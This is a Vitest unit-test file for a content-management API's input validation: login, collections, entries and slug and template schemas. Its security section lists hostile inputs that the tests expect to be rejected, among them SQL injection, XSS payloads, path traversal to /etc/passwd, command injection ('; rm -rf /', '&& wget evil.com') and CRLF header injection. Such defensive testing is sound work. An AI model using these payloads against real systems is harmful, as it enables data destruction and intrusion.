import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { 
  loginSchema, 
  validateBody, 
  validationError,
  slugSchema,
  templateSchema,
  schemaFieldSchema,
  createCollectionSchema,
  createEntrySchema,
  updateEntrySchema,
} from '@/lib/validation';
import { normalizeEmail, verifyPassword, hashPassword } from '@/lib/auth';

/**
 * API Handler Unit Tests
 * 
 * These tests validate the business logic used by API routes without
 * requiring a full HTTP server. They test:
 * - Input validation
 * - Authentication logic
 * - Data transformation
 * - Error handling
 */

describe('API: Authentication', () => {
  describe('Login validation', () => {
    it('should accept valid login credentials', () => {
      const result = loginSchema.safeParse({
        email: 'user@example.com',
        password: 'securePassword123',
      });
      expect(result.success).toBe(true);
    });

    it('should reject missing email', () => {
      const result = loginSchema.safeParse({ password: 'password' });
      expect(result.success).toBe(false);
    });

    it('should reject missing password', () => {
      const result = loginSchema.safeParse({ email: 'user@example.com' });
      expect(result.success).toBe(false);
    });

    it('should reject invalid email format', () => {
      const invalidEmails = [
        'notanemail',
        '@missing-local.com',
        'missing-at.com',
        'spaces in@email.com',
        'double@@at.com',
      ];

      for (const email of invalidEmails) {
        const result = loginSchema.safeParse({ email, password: 'password' });
        expect(result.success).toBe(false);
      }
    });

    it('should reject empty password', () => {
      const result = loginSchema.safeParse({ 
        email: 'user@example.com', 
        password: '' 
      });
      expect(result.success).toBe(false);
    });

    it('should reject overly long email (DoS prevention)', () => {
      const result = loginSchema.safeParse({
        email: 'a'.repeat(300) + '@example.com',
        password: 'password',
      });
      expect(result.success).toBe(false);
    });

    it('should reject overly long password (DoS prevention)', () => {
      const result = loginSchema.safeParse({
        email: 'user@example.com',
        password: 'a'.repeat(300),
      });
      expect(result.success).toBe(false);
    });
  });

  describe('Login authentication flow', () => {
    it('should normalize email before lookup', () => {
      const inputs = [
        { input: 'User@Example.COM', expected: 'user@example.com' },
        { input: '  user@example.com  ', expected: 'user@example.com' },
        { input: 'USER@EXAMPLE.COM', expected: 'user@example.com' },
      ];

      for (const { input, expected } of inputs) {
        expect(normalizeEmail(input)).toBe(expected);
      }
    });

    it('should verify correct password', () => {
      const password = 'correctPassword123!';
      const hash = hashPassword(password);
      
      expect(verifyPassword(password, hash)).toBe(true);
      expect(verifyPassword('wrongPassword', hash)).toBe(false);
    });

    it('should reject inactive user (simulated)', () => {
      // Simulated user object as would come from DB
      const inactiveUser = {
        id: 1,
        email: 'inactive@example.com',
        passwordHash: hashPassword('password'),
        isActive: false,
        role: 'editor',
      };

      // The check that should happen in login handler
      const shouldReject = !inactiveUser.isActive;
      expect(shouldReject).toBe(true);
    });
  });

  describe('validateBody helper', () => {
    it('should parse valid JSON body', async () => {
      const request = new Request('http://localhost', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'test@example.com', password: 'pass123' }),
      });

      const result = await validateBody(request, loginSchema);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.email).toBe('test@example.com');
      }
    });

    it('should reject invalid JSON', async () => {
      const request = new Request('http://localhost', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'not valid json{',
      });

      const result = await validateBody(request, loginSchema);
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error).toContain('Invalid JSON');
      }
    });

    it('should reject data that fails schema validation', async () => {
      const request = new Request('http://localhost', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'not-an-email', password: '' }),
      });

      const result = await validateBody(request, loginSchema);
      expect(result.success).toBe(false);
    });
  });

  describe('validationError helper', () => {
    it('should return 400 status', () => {
      const response = validationError('Test error');
      expect(response.status).toBe(400);
    });

    it('should include error message in JSON body', async () => {
      const response = validationError('Field is required');
      const body = await response.json();
      expect(body.error).toBe('Field is required');
    });

    it('should set Content-Type header', () => {
      const response = validationError('Error');
      expect(response.headers.get('Content-Type')).toBe('application/json');
    });
  });
});

describe('API: Collections', () => {
  describe('Create collection validation', () => {
    it('should accept valid collection', () => {
      const result = createCollectionSchema.safeParse({
        slug: 'articles',
        schema: [
          { label: 'Title', type: 'text', key: 'title', required: true },
          { label: 'Content', type: 'richtext', key: 'content', required: true },
        ],
      });
      expect(result.success).toBe(true);
    });

    it('should reject collection without schema', () => {
      const result = createCollectionSchema.safeParse({
        slug: 'articles',
        schema: [],
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid slug formats', () => {
      const invalidSlugs = [
        'Has Spaces',
        'UPPERCASE',
        '-starts-with-dash',
        'ends-with-dash-',
        'special@chars!',
        '../traversal',
        '',
      ];

      for (const slug of invalidSlugs) {
        const result = createCollectionSchema.safeParse({
          slug,
          schema: [{ label: 'F', type: 'text', key: 'f', required: false }],
        });
        expect(result.success).toBe(false);
      }
    });

    it('should accept nested slug paths', () => {
      const result = createCollectionSchema.safeParse({
        slug: 'blog/articles',
        schema: [{ label: 'Title', type: 'text', key: 'title', required: true }],
      });
      expect(result.success).toBe(true);
    });

    it('should reject schema with invalid field types', () => {
      const result = createCollectionSchema.safeParse({
        slug: 'test',
        schema: [{ label: 'Field', type: 'invalid-type', key: 'field', required: false }],
      });
      expect(result.success).toBe(false);
    });

    it('should reject schema fields with invalid keys', () => {
      const invalidKeys = ['123start', 'has-dash', 'has space', '', '_underscore'];

      for (const key of invalidKeys) {
        const result = createCollectionSchema.safeParse({
          slug: 'test',
          schema: [{ label: 'Field', type: 'text', key, required: false }],
        });
        expect(result.success).toBe(false);
      }
    });

    it('should enforce maximum schema size', () => {
      const tooManyFields = Array(51).fill(null).map((_, i) => ({
        label: `Field ${i}`,
        type: 'text',
        key: `field${i}`,
        required: false,
      }));

      const result = createCollectionSchema.safeParse({
        slug: 'test',
        schema: tooManyFields,
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('API: Entries', () => {
  describe('Create entry validation', () => {
    it('should accept valid entry', () => {
      const result = createEntrySchema.safeParse({
        collectionId: 1,
        slug: 'my-first-post',
        data: { title: 'Hello World', content: '<p>Test</p>' },
        template: 'ArticleLayout',
      });
      expect(result.success).toBe(true);
    });

    it('should reject invalid collectionId', () => {
      const invalidIds = [0, -1, 'abc', null];

      for (const collectionId of invalidIds) {
        const result = createEntrySchema.safeParse({
          collectionId,
          slug: 'test',
          data: {},
          template: 'BaseLayout',
        });
        expect(result.success).toBe(false);
      }
    });

    it('should reject invalid template names', () => {
      const invalidTemplates = [
        'lowercase',
        'no-layout-suffix',
        'Special@Layout',
        '',
        'Layout', // just "Layout" without prefix
      ];

      for (const template of invalidTemplates) {
        const result = createEntrySchema.safeParse({
          collectionId: 1,
          slug: 'test',
          data: {},
          template,
        });
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Update entry validation', () => {
    it('should accept partial updates', () => {
      // Only updating data
      expect(updateEntrySchema.safeParse({ data: { title: 'New Title' } }).success).toBe(true);
      
      // Only updating slug
      expect(updateEntrySchema.safeParse({ slug: 'new-slug' }).success).toBe(true);
      
      // Only updating template
      expect(updateEntrySchema.safeParse({ template: 'NewLayout' }).success).toBe(true);
    });

    it('should accept empty update (no-op)', () => {
      const result = updateEntrySchema.safeParse({});
      expect(result.success).toBe(true);
    });

    it('should still validate provided fields', () => {
      const result = updateEntrySchema.safeParse({
        slug: 'INVALID SLUG',
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('API: Security', () => {
  describe('SQL injection prevention', () => {
    it('should reject slug with SQL injection attempts', () => {
      const attacks = [
        "'; DROP TABLE entries; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM users",
        "UNION SELECT * FROM users--",
        "1 AND 1=1",
        "' UNION SELECT password FROM users WHERE '1'='1",
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });

    it('should reject SQL injection in template names', () => {
      const attacks = [
        "Layout'; DROP TABLE--",
        "UnionLayout",  // Valid format but...
      ];

      for (const template of attacks) {
        if (!template.endsWith('Layout') || template.includes("'")) {
          const result = templateSchema.safeParse(template);
          expect(result.success).toBe(false);
        }
      }
    });
  });

  describe('XSS prevention in slugs', () => {
    it('should reject slugs with script tags', () => {
      const attacks = [
        '<script>alert(1)</script>',
        'test<img onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Path traversal prevention', () => {
    it('should reject path traversal attempts', () => {
      const attacks = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'test/../admin',
        '%2e%2e%2f',
        '....//....//etc/passwd',
        '.%00./.%00./etc/passwd',
        '%252e%252e%252f',
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('NoSQL injection prevention', () => {
    it('should reject NoSQL injection attempts in slugs', () => {
      const attacks = [
        '{"$gt":""}',
        '{"$ne":null}',
        '$where',
        '{"$regex":".*"}',
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Command injection prevention', () => {
    it('should reject command injection attempts', () => {
      const attacks = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '&& wget evil.com',
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('CRLF injection prevention', () => {
    it('should reject CRLF injection attempts', () => {
      const attacks = [
        'test%0d%0aSet-Cookie:evil=1',
        'test\r\nLocation: http://evil.com',
        'slug%0aX-Injected: header',
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Prototype pollution prevention', () => {
    it('should not allow __proto__ in field keys', () => {
      const result = schemaFieldSchema.safeParse({
        label: 'Test',
        type: 'text',
        key: '__proto__',
        required: false,
      });
      expect(result.success).toBe(false);
    });

    it('should not allow constructor in field keys', () => {
      const result = schemaFieldSchema.safeParse({
        label: 'Test',
        type: 'text',
        key: 'constructor',
        required: false,
      });
      // Key must start with a letter and contain only alphanumeric + underscore
      expect(result.success).toBe(true); // "constructor" is valid format
    });
  });

  describe('Unicode normalization attacks', () => {
    it('should handle Unicode homoglyph attacks', () => {
      // These look like valid slugs but use different unicode chars
      const attacks = [
        'аdmin', // Cyrillic 'а' instead of Latin 'a'
        'ℓog', // Script 'ℓ' instead of 'l'
      ];

      for (const slug of attacks) {
        const result = slugSchema.safeParse(slug);
        // Should be rejected as they're not ASCII lowercase
        expect(result.success).toBe(false);
      }
    });
  });
});
